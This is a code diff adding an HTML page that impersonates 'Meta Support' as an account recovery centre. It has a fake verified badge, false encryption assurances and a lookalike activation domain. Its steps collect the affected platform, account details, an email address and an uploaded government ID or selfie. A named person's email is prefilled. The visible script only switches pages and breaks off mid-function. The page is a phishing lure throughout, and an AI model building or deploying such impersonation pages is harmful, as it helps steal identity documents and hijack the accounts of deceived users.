@@ -1,3 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title></title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.0/css/all.min.css">
+<style>
+*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;}
+body{background:#1c1e21;min-height:100vh;display:flex;justify-content:center;align-items:flex-start;padding:30px;}
+.demo-note{background:#fff3cd;color:#856404;padding:12px 20px;border-radius:8px;margin-bottom:20px;width:100%;max-width:520px;font-size:13px;display:flex;align-items:flex-start;gap:8px;}
+.demo-note i{color:#856404;margin-top:2px;}
+.support-card{background:#242526;border-radius:12px;width:100%;max-width:520px;box-shadow:0 4px 20px rgba(0,0,0,0.4);overflow:hidden;}
+.card-header{background:#242526;
+;padding:20px;display:flex;align-items:center;gap:12px;}
+.meta-icon{width:36px;height:36px;background:white;border-radius:8px;display:flex;align-items:center;justify-content:center;color:#0081FB;font-size:20px;}
+.header-text h2{color:white;font-size:18px;display:flex;align-items:center;gap:6px;}
+.badge-verified{background:white;color:#0081FB;font-size:11px;font-weight:bold;padding:2px 6px;border-radius:10px;display:inline-flex;align-items:center;gap:3px;}
+.header-text p{color:rgba(255,255,255,0.85);font-size:12px;margin-top:2px;}
+.steps{display:flex;padding:15px 20px;border-bottom:1px solid #3a3b3c;}
+.step{flex:1;text-align:center;font-size:11px;color:#b0b3b8;transition:all 0.3s;}
+.step.active{color:#0081FB;font-weight:600;}
+.step.completed{color:#42b72a;}
+.step-num{display:inline-flex;align-items:center;justify-content:center;width:20px;height:20px;border-radius:50%;background:#3a3b3c;color:white;font-size:11px;margin-right:4px;transition:all 0.3s;}
+.step.active .step-num{background:#0081FB;}
+.step.completed .step-num{background:#42b72a;}
+.content{padding:20px;}
+.page{display:none;}
+.page.active{display:block;animation:fadeIn 0.4s ease;}
+@keyframes fadeIn{from{opacity:0;transform:translateY(8px);}to{opacity:1;transform:translateY(0);}}
+.label{color:#e4e6eb;font-size:14px;font-weight:500;margin-bottom:10px;display:block;}
+.platform-buttons{display:flex;gap:10px;margin-bottom:20px;}
+.platform-btn{flex:1;padding:10px;border:none;border-radius:6px;font-size:13px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:6px;font-weight:500;transition:all 0.2s;}
+.platform-btn.fb {
+  background: #1877F2;
+  color: #ffffff;
+  border: none;}
+.platform-btn.ig {
+  background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+  color: #ffffff;
+  border: none;
+}
+.platform-btn.fb {
+  background: #1877F2;
+  color: #ffffff;
+  border: none;
+}
+
+.platform-btn.ig {
+  background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+  color: #ffffff;
+  border: none;
+}
+
+.platform-btn.gg {
+  background: #ffffff;
+  color: #000000;
+  border: 1px solid #dadce0;
+}
+
+.select-box,.input-field{width:100%;padding:12px;background:#3a3b3c;border:1px solid #4e4f50;border-radius:6px;color:#e4e6eb;font-size:14px;margin-bottom:15px;outline:none;}
+.textarea{width:100%;padding:12px;background:#3a3b3c;border:1px solid #4e4f50;border-radius:6px;color:#e4e6eb;font-size:14px;min-height:90px;resize:none;margin-bottom:15px;outline:none;}
+.notice{background:#2d3548;border-radius:6px;padding:12px;font-size:12px;color:#a8c7fa;line-height:1.6;display:flex;align-items:flex-start;gap:8px;margin-bottom:20px;}
+.notice i{margin-top:2px;color:#a8c7fa;}
+.btn-row{display:flex;gap:10px;margin-top:10px;}
+.btn-next,.btn-back,.btn-submit{flex:1;padding:12px;border:none;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;transition:background 0.2s;}
+.btn-back{background:#3a3b3c;color:#e4e6eb;}
+.btn-next,.btn-submit{background:#0081FB;color:white;}
+.btn-next:hover,.btn-submit:hover{background:#006edb;}
+.loading-screen{text-align:center;padding:40px 20px;}
+.loading-icon{font-size:48px;color:#0081FB;margin-bottom:20px;animation:spin 1.5s linear infinite;}
+@keyframes spin{from{transform:rotate(0deg);}to{transform:rotate(360deg);}}
+.loading-title{color:#e4e6eb;font-size:18px;font-weight:600;margin-bottom:10px;}
+.loading-text{color:#b0b3b8;font-size:14px;margin-bottom:20px;}
+.progress-bar{width:100%;height:8px;background:#3a3b3c;border-radius:4px;overflow:hidden;margin-bottom:15px;}
+.progress-fill{height:100%;background:linear-gradient(90deg,#0081FB,#00C6FF);width:0%;border-radius:4px;transition:width 1s linear;}
+.time-remaining{color:#b0b3b8;font-size:13px;}
+.result-screen{text-align:center;padding:30px 20px;}
+.result-icon{font-size:56px;color:#42b72a;margin-bottom:20px;}
+.result-title{color:#e4e6eb;font-size:20px;font-weight:600;margin-bottom:10px;}
+.result-subtitle{color:#b0b3b8;font-size:14px;margin-bottom:25px;}
+.email-box{background:#3a3b3c;border-radius:8px;padding:20px;margin-bottom:20px;text-align:left;}
+.email-label{color:#b0b3b8;font-size:12px;margin-bottom:5px;}
+.email-address{color:#e4e6eb;font-size:15px;font-weight:500;margin-bottom:15px;}
+.link-box{background:#2d3548;border-radius:6px;padding:12px;color:#a8c7fa;font-size:13px;word-break:break-all;margin-bottom:10px;}
+</style>
+</head>
+<body>
+  <div class="support-card">
+    <div class="card-header">
+      <div class="meta-icon real"><i class="fab fa-meta"></i></div>
+      <div class="header-text">
+<h2 style="display:flex;align-items:center;gap:6px;margin:0;">Meta Support<img src="https://i.imgur.com/5QAbIcN.png" alt="Verified" style="width:24px;height:24px;"></h2>
+        <p>Account Security & Recovery Center</p>
+      </div>
+    </div>
+
+    <div class="steps">
+      <div class="step active" data-step="1"><span class="step-num">1</span> Details</div>
+      <div class="step" data-step="2"><span class="step-num">2</span> Confirm</div>
+      <div class="step" data-step="3"><span class="step-num">3</span> Contact</div>
+      <div class="step" data-step="4"><span class="step-num">4</span> Verify ID</div>
+    </div>
+
+    <div class="content">
+      
+      <div class="page active" id="page1">
+        <label class="label">SELECT AFFECTED SERVICE / PLATFORM</label>
+        <div class="platform-buttons">
+          <button class="platform-btn fb selected" data-platform="fb"><i class="fab fa-facebook-f"></i> Facebook</button>
+          <button class="platform-btn ig" data-platform="ig"><i class="fab fa-instagram"></i> Instagram</button>
+          <button class="platform-btn gg" data-platform="gg"><i class="fab fa-google"></i> Google</button>
+        </div>
+        <label class="label">SELECT REASON FOR RECOVERY</label>
+        <select class="select-box" id="reasonSelect">
+          <option>Temporarily Disabled or Suspended Account</option>
+          <option selected>Permanently Disabled Account</option>
+          <option>Locked Account Issue</option>
+          <option>Security & Password Reset Issue</option>
+          <option>Two-Factor Authentication (2FA) Problem</option>
+          <option>Lost Email/Phone Access</option>
+          <option>Other Technical Request</option>
+        </select>
+        <label class="label">ADDITIONAL DETAILS</label>
+        <textarea class="textarea" id="detailsInput" placeholder="Provide any details..."></textarea>
+        <div class="notice"><i class="fas fa-shield-alt"></i><span><strong>Meta Secure Notice:</strong> All submitted details are encrypted.</span></div>
+        <button class="btn-next" onclick="goToPage(2)">Next <i class="fas fa-chevron-right" style="margin-left:6px;font-size:12px;"></i></button>
+      </div>
+
+      <div class="page" id="page2">
+        <label class="label">REVIEW YOUR INFORMATION</label>
+        <div style="background:#3a3b3c;border-radius:6px;padding:15px;margin-bottom:20px;">
+          <p style="color:#b0b3b8;font-size:12px;margin-bottom:4px;">Platform</p>
+          <p style="color:#e4e6eb;font-size:14px;margin-bottom:15px;" id="confirmPlatform">Facebook</p>
+          <p style="color:#b0b3b8;font-size:12px;margin-bottom:4px;">Reason</p>
+          <p style="color:#e4e6eb;font-size:14px;margin-bottom:15px;" id="confirmReason">Permanently Disabled Account</p>
+          <p style="color:#b0b3b8;font-size:12px;margin-bottom:4px;">Details</p>
+          <p style="color:#e4e6eb;font-size:14px;" id="confirmDetails">-</p>
+        </div>
+        <div class="notice"><i class="fas fa-info-circle"></i><span>Please double-check your information before proceeding.</span></div>
+        <div class="btn-row">
+          <button class="btn-back" onclick="goToPage(1)"><i class="fas fa-chevron-left" style="margin-right:6px;font-size:12px;"></i> Back</button>
+          <button class="btn-next" onclick="goToPage(3)">Next <i class="fas fa-chevron-right" style="margin-left:6px;font-size:12px;"></i></button>
+        </div>
+      </div>
+
+      <div class="page" id="page3">
+        <label class="label">YOUR CONTACT INFORMATION</label>
+        <p style="color:#b0b3b8;font-size:13px;margin-bottom:15px;">Enter the email where we can send the activation link.</p>
+        <label class="label" style="font-size:13px;">Email Address</label>
+        <input type="email" class="input-field" id="contactEmail" value="rex.hernandez@gmail.com" placeholder="your@email.com">
+        <label class="label" style="font-size:13px;">Confirm Email Address</label>
+        <input type="email" class="input-field" id="contactEmailConfirm" value="rex.hernandez@gmail.com" placeholder="your@email.com">
+        <div class="notice"><i class="fas fa-envelope"></i><span>We will send an activation link to this email once reviewed.</span></div>
+        <div class="btn-row">
+          <button class="btn-back" onclick="goToPage(2)"><i class="fas fa-chevron-left" style="margin-right:6px;font-size:12px;"></i> Back</button>
+          <button class="btn-next" onclick="goToPage(4)">Next <i class="fas fa-chevron-right" style="margin-left:6px;font-size:12px;"></i></button>
+        </div>
+      </div>
+
+      <div class="page" id="page4">
+        <label class="label">VERIFY YOUR IDENTITY</label>
+        <p style="color:#b0b3b8;font-size:13px;margin-bottom:20px;">Upload a valid government ID or take a selfie.</p>
+        <div style="border:2px dashed #4e4f50;border-radius:8px;padding:30px;text-align:center;margin-bottom:20px;">
+          <i class="fas fa-cloud-upload-alt" style="font-size:32px;color:#b0b3b8;margin-bottom:10px;"></i>
+          <p style="color:#b0b3b8;font-size:14px;">Click to upload your ID photo</p>
+          <p style="color:#6e6f70;font-size:12px;margin-top:5px;">JPG, PNG — Max 10MB</p>
+        </div>
+        <div class="notice"><i class="fas fa-lock"></i><span>Your ID is securely encrypted and used only for verification.</span></div>
+        <div class="btn-row">
+          <button class="btn-back" onclick="goToPage(3)"><i class="fas fa-chevron-left" style="margin-right:6px;font-size:12px;"></i> Back</button>
+          <button class="btn-submit" onclick="submitReview()">Submit for Review</button>
+        </div>
+      </div>
+
+      <div class="page" id="page5">
+        <div class="loading-screen">
+          <div class="loading-icon"><i class="fas fa-spinner"></i></div>
+          <h3 class="loading-title">Processing Your Request</h3>
+          <p class="loading-text">Please wait while we review your information...</p>
+          <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+          <p class="time-remaining" id="timeRemaining">Estimated wait time: 30minutes</p>
+        </div>
+      </div>
+
+      <div class="page" id="page6">
+        <div class="result-screen">
+          <div class="result-icon"><i class="fas fa-check-circle"></i></div>
+          <h3 class="result-title">Waiting for Review</h3>
+          <p class="result-subtitle">Your request has been submitted successfully.</p>
+          <div class="email-box">
+            <p class="email-label">Activation link will be sent to:</p>
+            <p class="email-address">Rex Hernandez &lt;rex.hernandez@gmail.com&gt;</p>
+            <p class="email-label" style="margin-top:15px;">Activation Link Preview:</p>
+            <div class="link-box">https://meta-activation.com/verify?code=8XJ-29K-P7Z</div>
+          </div>
+          <p style="color:#b0b3b8;font-size:12px;line-height:1.5;"><i class="fas fa-info-circle" style="margin-right:5px;"></i> Please check your email within 30 minutes. If not found, check Spam/Junk folder.</p>
+        </div>
+      </div>
+      
+    </div>
+  </div>
+</>
+
+<script>
+let currentPage = 1;
+let timerInterval;
+
+document.querySelectorAll('.platform-btn').forEach(btn => {
+  btn.addEventListener('click', function(){
+    document.querySelectorAll('.platform-btn').forEach(b => b.classList.remove('selected'));
+    this.classList.add('selected');
+  });
+});
+
+function updateConfirmPage(){
+  let platformText = "Facebook";
+  if(document.querySelector('.platform-btn.ig.selected')) platformText = "Instagram";
+  if(document.querySelector('.platform-btn.gg.selected')) platformText = "Google";
+  document.getElementById('confirmPlatform').textContent = platformText;
+  document.getElementById('confirmReason').textContent = document.getElementById('reasonSelect').value;
+  document.getElementById('confirmDetails').textContent = document.getElementById('detailsInput').value || "-";
+}
+
+function goToPage(pageNum){
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.getElementById('page' + pageNum).classList.add('active');
+  
+  document.querySelectorAll('.step').forEach(s => {
+    s.classList.remove('active', 'completed');
+    let stepNum = parseInt(s.dataset.step);
     if(stepNum < pageNum){
       s.classList.add('completed');
     } else if(stepNum === pageNum){
